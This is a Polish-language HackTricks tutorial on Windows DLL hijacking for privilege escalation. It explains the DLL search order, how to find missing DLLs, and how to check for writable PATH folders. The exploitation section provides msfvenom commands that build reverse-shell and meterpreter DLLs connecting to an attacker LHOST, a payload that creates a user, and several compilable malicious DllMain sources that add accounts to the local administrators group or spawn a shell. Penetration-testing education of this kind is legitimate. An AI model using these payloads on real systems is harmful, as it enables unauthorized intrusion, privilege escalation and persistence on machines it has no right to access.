# Dll Hijacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Basic Information

DLL Hijacking polega na manipulowaniu zaufaną aplikacją w celu załadowania złośliwego DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection i Side-Loading**. Jest głównie wykorzystywany do wykonywania kodu, osiągania trwałości i, rzadziej, eskalacji uprawnień. Mimo że skupiamy się tutaj na eskalacji, metoda hijackingu pozostaje spójna w różnych celach.

### Common Techniques

Wykorzystywanych jest kilka metod do hijackingu DLL, z których każda ma swoją skuteczność w zależności od strategii ładowania DLL aplikacji:

1. **DLL Replacement**: Wymiana autentycznego DLL na złośliwy, opcjonalnie z użyciem DLL Proxying w celu zachowania funkcjonalności oryginalnego DLL.
2. **DLL Search Order Hijacking**: Umieszczanie złośliwego DLL w ścieżce wyszukiwania przed legalnym, wykorzystując wzór wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Tworzenie złośliwego DLL, który aplikacja załadowuje, myśląc, że jest to nieistniejący wymagany DLL.
4. **DLL Redirection**: Modyfikowanie parametrów wyszukiwania, takich jak `%PATH%` lub pliki `.exe.manifest` / `.exe.local`, aby skierować aplikację do złośliwego DLL.
5. **WinSxS DLL Replacement**: Zastępowanie legalnego DLL złośliwym odpowiednikiem w katalogu WinSxS, metoda często związana z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczanie złośliwego DLL w katalogu kontrolowanym przez użytkownika z skopiowaną aplikacją, przypominającym techniki Binary Proxy Execution.

## Finding missing Dlls

Najczęstszym sposobem na znalezienie brakujących DLL w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z sysinternals, **ustawiając** **następujące 2 filtry**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

i pokazując tylko **Aktywność systemu plików**:

![](<../../.gitbook/assets/image (314).png>)

Jeśli szukasz **brakujących dll w ogóle**, powinieneś **pozostawić** to uruchomione przez kilka **sekund**.\
Jeśli szukasz **brakującego dll w konkretnej aplikacji**, powinieneś ustawić **inny filtr, taki jak "Nazwa procesu" "zawiera" "\<nazwa exec>", uruchomić go i zatrzymać rejestrowanie zdarzeń**.

## Exploiting Missing Dlls

Aby eskalować uprawnienia, najlepszą szansą, jaką mamy, jest możliwość **napisania dll, który proces z uprawnieniami spróbuje załadować** w jakimś **miejscu, gdzie będzie on wyszukiwany**. Dlatego będziemy mogli **napisać** dll w **folderze**, w którym **dll jest wyszukiwany przed** folderem, w którym znajduje się **oryginalny dll** (dziwny przypadek), lub będziemy mogli **napisać w jakimś folderze, gdzie dll będzie wyszukiwany**, a oryginalny **dll nie istnieje** w żadnym folderze.

### Dll Search Order

**W dokumentacji** [**Microsoftu**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **możesz znaleźć, jak DLL są ładowane konkretnie.**

**Aplikacje Windows** szukają DLL, podążając za zestawem **zdefiniowanych ścieżek wyszukiwania**, przestrzegając określonej sekwencji. Problem hijackingu DLL pojawia się, gdy złośliwy DLL jest strategicznie umieszczany w jednym z tych katalogów, zapewniając, że zostanie załadowany przed autentycznym DLL. Rozwiązaniem, aby temu zapobiec, jest upewnienie się, że aplikacja używa ścieżek bezwzględnych, gdy odnosi się do wymaganych DLL.

Możesz zobaczyć **kolejność wyszukiwania DLL w systemach 32-bitowych** poniżej:

1. Katalog, z którego aplikacja została załadowana.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę do tego katalogu. (_C:\Windows\System32_)
3. Katalog systemu 16-bitowego. Nie ma funkcji, która uzyskuje ścieżkę do tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę do tego katalogu. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Należy zauważyć, że nie obejmuje to ścieżki per-aplikacji określonej przez klucz rejestru **App Paths**. Klucz **App Paths** nie jest używany przy obliczaniu ścieżki wyszukiwania DLL.

To jest **domyślna** kolejność wyszukiwania z włączonym **SafeDllSearchMode**. Gdy jest wyłączony, bieżący katalog awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) jest wywoływana z **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, wyszukiwanie zaczyna się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

Na koniec zauważ, że **dll może być załadowany, wskazując bezwzględną ścieżkę, a nie tylko nazwę**. W takim przypadku ten dll **będzie wyszukiwany tylko w tej ścieżce** (jeśli dll ma jakieś zależności, będą one wyszukiwane tak, jakby były załadowane tylko po nazwie).

Istnieją inne sposoby na zmianę sposobów zmiany kolejności wyszukiwania, ale nie zamierzam ich tutaj wyjaśniać.

#### Exceptions on dll search order from Windows docs

Niektóre wyjątki od standardowej kolejności wyszukiwania DLL są zauważane w dokumentacji Windows:

* Gdy napotkany jest **DLL, który dzieli swoją nazwę z już załadowanym w pamięci**, system pomija zwykłe wyszukiwanie. Zamiast tego wykonuje sprawdzenie przekierowania i manifestu, zanim domyślnie przejdzie do DLL już w pamięci. **W tym scenariuszu system nie przeprowadza wyszukiwania DLL**.
* W przypadkach, gdy DLL jest rozpoznawany jako **znany DLL** dla bieżącej wersji Windows, system wykorzysta swoją wersję znanego DLL, wraz z dowolnymi jego zależnymi DLL, **pomijając proces wyszukiwania**. Klucz rejestru **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych znanych DLL.
* Jeśli **DLL ma zależności**, wyszukiwanie tych zależnych DLL jest przeprowadzane tak, jakby były wskazane tylko przez swoje **nazwy modułów**, niezależnie od tego, czy początkowy DLL został zidentyfikowany przez pełną ścieżkę.

### Escalating Privileges

**Wymagania**:

* Zidentyfikuj proces, który działa lub będzie działał z **innymi uprawnieniami** (ruch poziomy lub boczny), który **nie ma DLL**.
* Upewnij się, że **dostęp do zapisu** jest dostępny dla dowolnego **katalogu**, w którym **DLL** będzie **wyszukiwany**. To miejsce może być katalogiem wykonywalnym lub katalogiem w ścieżce systemowej.

Tak, wymagania są skomplikowane do znalezienia, ponieważ **domyślnie jest dość dziwne znaleźć uprzywilejowany plik wykonywalny bez dll** i jest jeszcze **dziwniejsze mieć uprawnienia do zapisu w folderze ścieżki systemowej** (domyślnie nie możesz). Ale w źle skonfigurowanych środowiskach jest to możliwe.\
W przypadku, gdy masz szczęście i spełniasz wymagania, możesz sprawdzić projekt [UACME](https://github.com/hfiref0x/UACME). Nawet jeśli **głównym celem projektu jest obejście UAC**, możesz tam znaleźć **PoC** hijackingu DLL dla wersji Windows, której możesz użyć (prawdopodobnie zmieniając tylko ścieżkę folderu, w którym masz uprawnienia do zapisu).

Zauważ, że możesz **sprawdzić swoje uprawnienia w folderze**, wykonując:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich folderów w PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz również sprawdzić importy pliku wykonywalnego i eksporty dll za pomocą:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Aby uzyskać pełny przewodnik na temat **wykorzystania Dll Hijacking do eskalacji uprawnień** z uprawnieniami do zapisu w **folderze System Path**, sprawdź:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Narzędzia automatyczne

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sprawdzi, czy masz uprawnienia do zapisu w jakimkolwiek folderze w system PATH.\
Inne interesujące narzędzia automatyczne do odkrywania tej podatności to **funkcje PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Przykład

W przypadku znalezienia scenariusza do wykorzystania, jedną z najważniejszych rzeczy, aby skutecznie go wykorzystać, będzie **stworzenie dll, która eksportuje przynajmniej wszystkie funkcje, które wykonywalny plik zaimportuje z niej**. Tak czy inaczej, zauważ, że Dll Hijacking jest przydatny do [eskalacji z poziomu Medium Integrity do High **(obejście UAC)**](../authentication-credentials-uac-and-efs.md#uac) lub z [**High Integrity do SYSTEM**](./#from-high-integrity-to-system)**.** Możesz znaleźć przykład **jak stworzyć ważną dll** w tym badaniu dotyczącym dll hijacking skoncentrowanym na dll hijacking do wykonania: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ponadto, w **następnej sekcji** znajdziesz kilka **podstawowych kodów dll**, które mogą być przydatne jako **szablony** lub do stworzenia **dll z niepotrzebnymi funkcjami eksportowanymi**.

## **Tworzenie i kompilowanie Dlls**

### **Proxifikacja Dll**

W zasadzie **Dll proxy** to Dll zdolna do **wykonywania twojego złośliwego kodu po załadowaniu**, ale także do **ekspozycji** i **działania** zgodnie z **oczekiwaniami**, **przekazując wszystkie wywołania do prawdziwej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz faktycznie **wskazać wykonywalny plik i wybrać bibliotekę**, którą chcesz proxifikować oraz **wygenerować proxifikowaną dll** lub **wskazać Dll** i **wygenerować proxifikowaną dll**.

### **Meterpreter**

**Uzyskaj rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Zdobądź meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86, nie widziałem wersji x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Twoje własne

Zauważ, że w kilku przypadkach Dll, którą kompilujesz, musi **eksportować kilka funkcji**, które będą ładowane przez proces ofiary; jeśli te funkcje nie istnieją, **plik binarny nie będzie w stanie ich załadować** i **eksploit się nie powiedzie**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## References

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **zarejestruj się** w **Intigriti**, premium **platformie bug bounty stworzonej przez hackerów, dla hackerów**! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody do **100 000 $**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
